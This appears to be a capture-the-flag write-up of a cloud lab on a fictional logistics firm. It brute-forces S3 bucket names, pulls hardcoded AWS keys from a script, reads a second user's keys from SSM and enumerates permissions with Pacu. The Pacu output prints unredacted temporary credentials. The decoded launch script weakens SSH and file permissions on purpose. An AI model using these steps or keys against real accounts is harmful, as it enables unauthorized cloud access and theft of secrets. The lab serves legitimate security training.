https://app.pwnedlabs.io/labs/s3-bucket-brute-force-to-breach

### Scenario

Huge Logistics, a global powerhouse, has enlisted your expertise to evaluate their cloud security measures. During your preliminary scans, an S3 bucket titled hlogistics-web caught your attention. Your mission is to use knowledge of the naming convention to access other S3 buckets, and pivot to other cloud services if possible.

### Information provided

```
S3 bucket name:-

hlogistics-web
```

### Enumeration

Checking the webpage for S3 bucket if it reveals any information.

```
https://hlogistics-web.s3.amazonaws.com/
```

![](./images/Pasted%20image%2020260803224030.png)

We can see that an `index.html` file is present inside this bucket which usually means a web server front page. Lets try accessing it.

```
https://hlogistics-web.s3.amazonaws.com/index.html
```

![](./images/Pasted%20image%2020260803224111.png)

We were right, it does open a landing page for a website! Lets review the source code to check for any interesting information.

![](./images/Pasted%20image%2020260809000342.png)

From the source code it is visible that multiple S3 buckets have been used and they follow a general naming convention - `hlogistics-<name>`. We will try to enumerate for more S3 buckets using `ffuf` for bruteforce.

#### S3 Enumeration

```
ffuf -X HEAD -u "https://hlogistics-FUZZ.s3.amazonaws.com/" -w /home/ayush-parab/ayush/HackTheBox/CPTS/SecLists/Discovery/Web-Content/common.txt -fc 404 -v
```

`-X` is used to specify the http method to be used
`-u` specifies the URL with `FUZZ` as the placeholder where the words from the wordlist will be used
`-fc` used to filter responses on the basis of response code
`-v` verbose output

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : HEAD
 :: URL              : https://hlogistics-FUZZ.s3.amazonaws.com/
 :: Wordlist         : FUZZ: /home/ayush-parab/ayush/HackTheBox/CPTS/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
________________________________________________

[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 323ms]
| URL | https://hlogistics-Images.s3.amazonaws.com/
    * FUZZ: Images

[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 299ms]
| URL | https://hlogistics-beta.s3.amazonaws.com/
    * FUZZ: beta

[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 307ms]
| URL | https://hlogistics-images.s3.amazonaws.com/
    * FUZZ: images

[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 408ms]
| URL | https://hlogistics-storage.s3.amazonaws.com/
    * FUZZ: storage

[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 277ms]
| URL | https://hlogistics-web.s3.amazonaws.com/
    * FUZZ: web

:: Progress: [4751/4751] :: Job [1/1] :: 10 req/sec :: Duration: [0:06:46] :: Errors: 194 ::
```

We have received several `S3` buckets with `200 OK` status indicating they are up and running. Lets try to explore the data inside one of these buckets.
#### hlogistics-beta


![](./images/Pasted%20image%2020260803231653.png)

`hlogistics-beta` bucket contains the following python script file, lets try to access it and check the contents.

![](./images/Pasted%20image%2020260803231707.png)

We get hardcoded credentials inside the script file!

### Initial foothold

Lets login using those credentials in aws cli.

```
aws sts get-caller-identity
```

```
{
    "UserId": "AIDATRPHKUQK3U6DLVPIY",
    "Account": "243687662613",
    "Arn": "arn:aws:iam::243687662613:user/ecollins"
}
```

We are currently logged in as `ecollins` user.

### IAM enumeration

We will now try to find out what all permissions are present with the `ecollins` user.

```
aws s3 ls
```

```
aws: [ERROR]: An error occurred (AccessDenied) when calling the ListBuckets operation: User: arn:aws:iam::243687662613:user/ecollins is not authorized to perform: s3:ListAllMyBuckets because no identity-based policy allows the s3:ListAllMyBuckets action
```

We cannot list the S3 buckets.

```
aws iam list-user-policies --user-name ecollins
```

```
{
    "PolicyNames": [
        "SSM_Parameter"
    ]
}
```

A policy named `SSM_Parameter` is attached to the user.

### Lateral Movement

```
aws iam get-user-policy --user-name ecollins --policy-name SSM_Parameter
```

```
{
    "UserName": "ecollins",
    "PolicyName": "SSM_Parameter",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Action": [
                    "ssm:GetParameter",
                    "ssm:DescribeParameters"
                ],
                "Resource": "arn:aws:ssm:eu-west-2:243687662613:parameter/lharris"
            }
        ]
    }
}
```

On going through the above policy it is clear that we have permissions to run `GetParameter` command on one of the `parameter` resource in `SSM`
`SSM` is the systems manager in AWS, it can be used to store secrets in the form of `parameter`

We will use the `GetParameter` command.

```
aws ssm get-parameter --name lharris
```

```
{
    "Parameter": {
        "Name": "lharris",
        "Type": "StringList",
        "Value": "AKIATRP<REDACTED>,Jicw<REDACTED>",
        "Version": 3,
        "LastModifiedDate": "2026-06-15T23:52:58.298000+05:30",
        "ARN": "arn:aws:ssm:eu-west-2:243687662613:parameter/lharris",
        "DataType": "text"
    }
}
```

The type is mentioned as `StringList` which means the `Value` field will have comma separated values. On looking closely, it appears to be a pair of access keys used to log in to a user in aws cli.

```
aws sts get-caller-identity
```

```
{
    "UserId": "AIDATRPHKUQK46UGVDBGN",
    "Account": "243687662613",
    "Arn": "arn:aws:iam::243687662613:user/lharris"
}
```

After using the credentials, we have been logged in as `lharris` user!

### IAM Enumeration

This time instead of relying on manual testing, lets use a tool called `pacu` to enumerate the permissions this user has.

```
Pacu (lharris:None) > run iam__bruteforce_permissions --region eu-west-2
```

```
  Running module iam__bruteforce_permissions...
[iam__bruteforce_permissions] Enumerated IAM Permissions:
[iam__bruteforce_permissions] Enumerating eu-west-2
2026-08-05 22:52:27,220 - 10805 - [INFO] Starting permission enumeration for access-key-id "AKIATRPHKUQKTZDLOVHB"
2026-08-05 22:52:29,210 - 10805 - [INFO] -- Account ARN : arn:aws:iam::243687662613:user/lharris
2026-08-05 22:52:29,210 - 10805 - [INFO] -- Account Id  : 243687662613
2026-08-05 22:52:29,211 - 10805 - [INFO] -- Account Path: user/lharris
2026-08-05 22:52:29,518 - 10805 - [INFO] Attempting common-service describe / list brute force.
2026-08-05 22:52:30,860 - 10805 - [INFO] -- dynamodb.describe_endpoints() worked!
2026-08-05 22:52:44,821 - 10805 - [ERROR] Remove globalaccelerator.describe_accelerator_attributes action
2026-08-05 22:52:49,794 - 10805 - [INFO] -- sts.get_session_token() worked!
2026-08-05 22:52:50,107 - 10805 - [INFO] -- sts.get_caller_identity() worked!
2026-08-05 22:52:50,993 - 10805 - [INFO] -- ec2.describe_launch_templates() worked!
[iam__bruteforce_permissions] iam:
[iam__bruteforce_permissions]   root_account: False
[iam__bruteforce_permissions]   arn: arn:aws:iam::243687662613:user/lharris
[iam__bruteforce_permissions]   arn_id: 243687662613
[iam__bruteforce_permissions]   arn_path: user/lharris
[iam__bruteforce_permissions] bruteforce:
[iam__bruteforce_permissions]   dynamodb.describe_endpoints: {'Endpoints': [{'Address': 'dynamodb.eu-west-2.amazonaws.com', 'CachePeriodInMinutes': 1440}]}
[iam__bruteforce_permissions]   sts.get_session_token: {'Credentials': {'AccessKeyId': 'ASIATRPHKUQKUIVXSQCQ', 'SecretAccessKey': 'jaiqpRAcZxaWQV2JIRH3cD/f+1DLOoL8X6BYYPqS', 'SessionToken': 'FwoGZXIvYXdzEHMaDG2SNSeYl9zf35lD+SKCATMNzq7jEIMBbkNJVciZNuZqz0GMCMiK0jSu47r4Og43WB9aryx86VMzeW0YZ5ys3cz0mmDclVVNRSBOO32hGij0DzPoTKvWrdIuXH71zfFPpAJYTO79mhe6MSBvfHFlkGsgZI5SfxFoqoto6Jez83zXXYoE0OeM5tBJ/3YjfT09OMIo6eLN0wYyKCAbCVDClyde9xcF04lbBlYp/R8Sw0QLgC7dCHdiUA+j2kGpPrsJBhg=', 'Expiration': datetime.datetime(2026, 8, 6, 5, 22, 49, tzinfo=tzutc())}}
[iam__bruteforce_permissions]   sts.get_caller_identity: {'UserId': 'AIDATRPHKUQK46UGVDBGN', 'Account': '243687662613', 'Arn': 'arn:aws:iam::243687662613:user/lharris'}
[iam__bruteforce_permissions]   ec2.describe_launch_templates: {'LaunchTemplates': [{'LaunchTemplateId': 'lt-05c3bbb6108e76f9b', 'LaunchTemplateName': 'SCHEDULER', 'CreateTime': datetime.datetime(2025, 3, 4, 20, 35, 50, tzinfo=tzutc()), 'CreatedBy': 'arn:aws:iam::243687662613:root', 'DefaultVersionNumber': 1, 'LatestVersionNumber': 1}]}
[iam__bruteforce_permissions] iam__bruteforce_permissions completed.

[iam__bruteforce_permissions] MODULE SUMMARY:

Num of IAM permissions found: 4 
```

We do see some interesting information!

```
Pacu (lharris:None) > whoami
```

```
{
  "UserName": "lharris",
  "RoleName": null,
  "Arn": "arn:aws:iam::243687662613:user/lharris",
  "AccountId": "243687662613",
  "UserId": "AIDATRPHKUQK46UGVDBGN",
  "Roles": null,
  "Groups": [],
  "Policies": [],
  "AccessKeyId": "AKIATRP<REDACTED>",
  "SecretAccessKey": "JicwEo+sWrog1ToVStNd********************",
  "SessionToken": null,
  "KeyAlias": "None",
  "PermissionsConfirmed": false,
  "Permissions": {
    "Allow": [
      "dynamodb:DescribeEndpoints",
      "sts:GetSessionToken",
      "sts:GetCallerIdentity",
      "ec2:DescribeLaunchTemplates"
    ],
    "Deny": []
  }
}
```

Lets try the commands in the `Allow` list one by one.

### Data Exfiltration

```
aws dynamodb describe-endpoints
```

```
{
    "Endpoints": [
        {
            "Address": "dynamodb.eu-west-2.amazonaws.com",
            "CachePeriodInMinutes": 1440
        }
    ]
}
```

![](./images/Pasted%20image%2020260809002913.png)

`Dynamodb` does not reveal anything interesting.

```
aws sts get-session-token
```

```
{
    "Credentials": {
        "AccessKeyId": "ASIAT<REDACTED>",
        "SecretAccessKey": "udn3/Hx5VX<REDACTED>",
        "SessionToken": "IQoJb3JpZ2luX2VjEKr//////////wEa<REDACTED>",
        "Expiration": "2026-08-09T05:52:41+00:00"
    }
}
```

After using the above credentials, we are still logged in as `lharris`

```
aws ec2 describe-launch-templates
```

```
{
    "LaunchTemplates": [
        {
            "LaunchTemplateId": "lt-05<REDACTED>",
            "LaunchTemplateName": "SCHEDULER",
            "CreateTime": "2025-03-04T20:35:50+00:00",
            "CreatedBy": "arn:aws:iam::243687662613:root",
            "DefaultVersionNumber": 1,
            "LatestVersionNumber": 1,
            "Operator": {
                "Managed": false
            }
        }
    ]
}
```

This reveals some interesting information. We can see a launch template for EC2 which was created by `root`. Lets try to get more information regarding this launch template.

```
aws ec2 describe-launch-template-versions --launch-template-id lt-05c3b<REDACTED>
```

```
{
    "LaunchTemplateVersions": [
        {
            "LaunchTemplateId": "lt-05c<REDACTED>",
            "LaunchTemplateName": "SCHEDULER",
            "VersionNumber": 1,
            "VersionDescription": "Production logistics scheduling application",
            "CreateTime": "2025-03-04T20:35:50+00:00",
            "CreatedBy": "arn:aws:iam::243687662613:root",
            "DefaultVersion": true,
            "LaunchTemplateData": {
                "ImageId": "ami-091f<REDACTED>",
                "InstanceType": "t2.medium",
                "UserData": "IyEvYmluL2Jhc2gKCmFwdCB<REDACTED>",
                "MetadataOptions": {
                    "HttpTokens": "optional",
                    "HttpPutResponseHopLimit": 2,
                    "HttpEndpoint": "enabled"
                }
            },
            "Operator": {
                "Managed": false
            }
        }
    ]
}
```

The `UserData` part from the above output is base64 encoded. We will use cyberchef to decode it.

```
#!/bin/bash

apt install -y aws-cli docker git curl unzip httpd mysql

systemctl enable docker
systemctl start docker
usermod -aG docker ec2-user
chmod 777 /var/run/docker.sock

mkdir -p /opt/huge-logistics
cd /opt/huge-logistics

aws s3 cp s3://huge-logistics-private/config.sh .
chmod +x config.sh
./config.sh

aws configure set region us-east-1

docker pull images.huge-logistic.local/worker:latest
docker run -d --name logistics-worker -p 8080:8080 images.huge-logistic.local/worker:latest

echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config
echo "AllowUsers ec2-user root" >> /etc/ssh/sshd_config
systemctl restart sshd

chmod -R 777 /etc

flag: 797<REDACTED>
```

Here we have the flag in plain sight in the b64 decoded format!